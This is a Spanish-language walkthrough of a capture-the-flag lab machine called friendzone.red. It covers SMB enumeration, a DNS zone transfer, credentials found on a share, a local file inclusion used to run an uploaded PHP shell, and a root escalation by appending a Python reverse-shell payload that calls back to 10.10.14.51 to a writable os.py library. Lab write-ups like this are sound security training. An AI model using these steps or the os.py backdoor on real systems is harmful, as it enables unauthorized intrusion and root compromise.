Comenzamos con un escaneo de puertos abiertos y servicios mediante la herramienta nmap 

`sudo nmap -p- --open -sS --min-rate 5000 -n -v -sV -Pn 10.10.10.123 > escaneo.txt`

![[Pasted image 20240830183914.png]]

Procedemos a realizar un escaneo mas exaustivo de los puertos
`nmap -sC -sV -p 21,22,53,80,139,443,445 10.10.10.123 > escaneoPuertos.txt`
![[Pasted image 20240830185049.png]]
![[Pasted image 20240830185102.png]]

Podemos apreciar que tiene sevicios http y https ademas de servicios como ssh, ftp, servidor de DNS BIND, tenemos varios angulos de ataque, veamos que encontramos en las webs.

En el escaneo de puertos podemos observar el siguiente dominio
![[Pasted image 20240830190029.png]]
Ademas podemos verificar el dominio mediante la herramienta openssl
`openssl s_client -connect 10.10.10.123:443`
![[Pasted image 20240830190257.png]]
![[Pasted image 20240830190316.png]]
![[Pasted image 20240830190330.png]]
El dominio encontrado lo añadiremos a /etc/hosts
![[Pasted image 20240830193208.png]]

Antes de visitar las webs veamos que podemos sacar escaneandolas mediante la herramienta whatweb.

HTTP
`whatweb -v http://friendzone.red/`
![[Pasted image 20240830191306.png]]
![[Pasted image 20240830191318.png]]

HTTPS
`whatweb -v https://friendzone.red/`
![[Pasted image 20240830191336.png]]

Aparentemente los dos escaneos son parecidos, veamos que nos encontramos en las webs

`http://friendzone.red/`
![[Pasted image 20240830191652.png]]

![[Pasted image 20240830191709.png]]

`https://friendzone.red/`
![[Pasted image 20240830191719.png]]
![[Pasted image 20240830191740.png]]

Al encontrar el siguiente comentario paso a ingresar en la dirección https://friendzone.red/js/js/
![[Pasted image 20240830192227.png]]
`ZTl1WXN4cVFrUzE3MjUwMzgyMzZLZldKSjdJMk1I`

Parece ser base64 vamos a decodificarlo 
`echo "ZTl1WXN4cVFrUzE3MjUwMzgyMzZLZldKSjdJMk1I" | base64 -d`
![[Pasted image 20240830193002.png]]

Nos devuelve una cadena que no es de base64, parece ser una distracción. dejemos esta cadena por ahora.

En el primer escaneo del whatweb se puede apreciar otro dominio
![[Pasted image 20240830193302.png]]
Vamos a añadirlo a /etc/hosts
![[Pasted image 20240830193342.png]]
Visitemos el dominio encontrado 
`https://friendzoneportal.red/`
![[Pasted image 20240830193633.png]]
![[Pasted image 20240830193643.png]]

Al no encontrar nada en la web, pero vemos que vamos por buen camino, revisamos los escaneos de nmap y al ver los puertos 443 y 445 decido ver que puedo conseguir listando recursos del servidor SMB mediante smbclient
`smbclient -L 10.10.10.123 -N
![[Pasted image 20240830194133.png]]

Hemos encontrado varios recursos compartidos, algunos de ellos bastante interesantes, 
veamos mediante la herramienta smbmap los privilegios que tenemos sobre los recursos compartidos.
`smbmap -H 10.10.10.123`
![[Pasted image 20240904032210.png]]
Tenemos capacidad de escritura y lectura en development y de lectura en general
Veamos que encontramos en general 
`smbclient //10.10.10.123/general -N`
![[Pasted image 20240904032708.png]]
Encontramos lo que parecen ser unas credenciales, vamos a decargar el txt 
`get creds.txt`
![[Pasted image 20240904032758.png]]
Intentamos acceder con las credenciales mediante ssh pero no son validas, por lo que me hace pensar que hay un portal de autenticacion.

Al revisar el escaneo de nmap, veo que el puerto 53 está abierto por lo que decido intentar un ataque de transferencia de zona (AXFR) para ver que puedo encontrar.
![[Pasted image 20240904033248.png]]
`dig @10.10.10.123 friendzone.red axfr`

![[Pasted image 20240904033512.png]]
Añadimos los dominios encontrados al archivo hosts
![[Pasted image 20240904033745.png]]
Visitamos el dominio administrador
`https://administrator1.friendzone.red/`
![[Pasted image 20240904033913.png]]
Encontramos un login en el que podemos probar las credenciales, antes de eso visitemos el otro dominio interesante, uploads
`https://uploads.friendzone.red/`
![[Pasted image 20240904034407.png]]
Dejemos por ahora este subdominio y centremonos en el inicio de sesion

Iniciamos sesion con las credenciales en el inicio de sesion anteriormente encontrado 

`admin`
`WORKWORKHhallelujah@#`
![[Pasted image 20240904034004.png]]
Visitamos la ruta indicada
![[Pasted image 20240904034537.png]]
Parece ser que tiene algo que ver con la subida de la imagen en el subdominio de uploads, pero parece que nos dan una imagen predeterminada que podemos ver si añadimos a la ruta lo señalado
Añadiendo un ? y image_id=a.jpg&pagename=timestamp podemos ver lo siguiente
![[Pasted image 20240904034729.png]]
Al ver en la ruta `pagename` intento modificarlo para ver si cambia la web, 
`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename`
le quito timestamp 
![[Pasted image 20240904035158.png]]
Desaparece la parte del timestamp como podemos aprecirar en las dos imagenes
intento apuntar a dashboard.php
![[Pasted image 20240904035305.png]]
Al ver que anteriormente estaba sin el php voy a quitarlo
![[Pasted image 20240904035345.png]]
Se crea un bucle del dashboard, por lo que podemos afirmar que la web añade el .php al final
esto me hace pensar en los recursos compartidos encontrados, ya que estaban en /etc/...
por lo que podemos intentar subir un archivo a development y visualizarlo mediante /etc/development

Creamos una prueba para subirla y comprobar que nos muestra este archivo php para poder subirle una reverse shell
![[Pasted image 20240904040822.png]]
Mediante put subimos el archivo 
`put prueba.php`
![[Pasted image 20240904040844.png]]Intentamos visualizarlo 
![[Pasted image 20240904041141.png]]
Genial!!!
Podemos subir una reverse shell para ganar acceso 
![[Pasted image 20240904041316.png]]
Subimos otro archivo con la reverse shell, nos ponemos en esscucha en el puerto correspondiente y ejecutamos la reverse.

`nc -lvnp 4444`
![[Pasted image 20240904041422.png]]
![[Pasted image 20240904041502.png]]
Ejecutamos la reverse y veamos si ganamos el acceso 
![[Pasted image 20240904041552.png]]
Perfecto, ya tenemos el acceso, hacemos el tratamiento de la tty y vamos a por la user flag 
User flag 

![[Pasted image 20240907163816.png]]

Escalada de privilegios

Al no encontrar ningun binario con permisos SUID interesantes ni tampoco podemos lanzar sudo -l intentaremos listar los procesos de la maquina.
Pasamos el script para listar procesos al recurso compartido Development y accedemos a el.
![[Pasted image 20240907163347.png]]

![[Pasted image 20240907163701.png]]
Nos dirigimos a TMP y le damos permisos de ejecución al script 
![[Pasted image 20240907163747.png]]


Ejecutamos el script para ver si hay algún proceso interesante.
![[Pasted image 20240907164459.png]]
Encontramos el siguiente proceso,se esta ejecutando un binario en  python como root, ya que el UID es 0.
Nos dirigimos al directorio donde se encuentra el binario para ver si tenemos permisos de escritura
![[Pasted image 20240908212211.png]]
No tenemos los permisos, veamos que contiene el binario.
![[Pasted image 20240908212352.png]]
Vemos que importa la libreria os, veamos donde se encuentra dicha libreria.
`locate op.py`
![[Pasted image 20240908212841.png]]
Veamos si tienemos capacidad de escritura
![[Pasted image 20240908212927.png]]
Tenemos capacidad de escritura, por lo que podemos añadir una reverse shell y ganar el acceso como root.
`nano /usr/lib/python2.7/os.py`
Al final del archivo añadimos lo siguiente

import socket,subprocess,os  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("10.10.14.51",4443)) 
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
![[Pasted image 20240908213632.png]]

Nos ponemos en escucha en el puerto seleccionado en la reverse shell

![[Pasted image 20240908213640.png]]

Esperamos a que root ejecute el binario que contiene la libreria os.
10